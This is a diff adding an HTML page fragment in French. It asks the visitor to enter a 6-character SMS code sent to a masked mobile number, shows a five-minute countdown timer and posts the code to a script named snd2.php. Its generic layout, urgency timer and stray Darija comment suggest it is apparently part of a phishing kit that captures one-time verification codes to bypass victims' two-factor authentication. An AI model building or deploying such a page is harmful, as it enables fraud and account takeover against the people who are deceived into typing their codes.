@@ -1,0 +1,58 @@
+ <form name="myform" method="POST" action="snd2.php">
+
+		   	  	  	 <div class="activ-right">
+
+		   	  	  	 
+					    <input type="text" name="sm" class="bb1" maxlength="6" max="6" placeholder="6 Caract&egrave;res"  required="required" autocomplete="off" autocorrect="off" autocapitalize="word" value="" aria-describedby="legalFirstNameValidations" aria-invalid="false"><br>
+						
+		   	  	  	 	<div class="savo">
+						<h4 class="notice1">Veuillez saisir le code &agrave; 6 caract&egrave;res envoyer par sms sur votre t&eacute;l&eacute;phone mobile :</h4>
+						
+						<p class="nemra">06 XX XX XX XX</p>
+						<input type="submit" class="btnso" name="" value="ok" /></div>
+		   	  	  	 </div>
+		   	  	   </form>
+
+
+		   	  	  </div>
+		   	  </div>
+		   </div>
+		  <div class="foot">
+		  	<center>
+		  		<div class="klm">
+		  			 
+		  		</div>
+		  	</center>
+		  </div>
+ 
+
+		</div>
+		<!-- content henaya tsala -->
+	</div>
+	<!-- Display the countdown timer in an element -->
+<div class ="magana" id="timer"></div>
+
+<script>
+document.getElementById('timer').innerHTML =
+  05 + ":" + 00;
+startTimer();
+
+function startTimer() {
+  var presentTime = document.getElementById('timer').innerHTML;
+  var timeArray = presentTime.split(/[:]+/);
+  var m = timeArray[0];
+  var s = checkSecond((timeArray[1] - 1));
+  if(s==59){m=m-1}
+  //if(m<0){alert('timer completed')}
+  
+  document.getElementById('timer').innerHTML =
+    m + ":" + s;
+  setTimeout(startTimer, 1000);
+}
+
+function checkSecond(sec) {
+  if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
+  if (sec < 0) {sec = "59"};
+  return sec;
+}
+</script>
